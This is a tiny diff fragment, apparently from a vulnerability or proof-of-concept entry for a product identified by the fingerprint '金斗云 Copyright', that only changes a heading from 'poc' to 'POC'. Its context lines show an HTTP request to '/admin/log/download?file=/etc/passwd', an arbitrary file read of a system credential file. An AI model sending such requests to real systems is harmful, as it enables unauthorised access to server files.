@@ -8,7 +8,7 @@
 body="金斗云 Copyright"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /admin/log/download?file=/etc/passwd HTTP/1.1
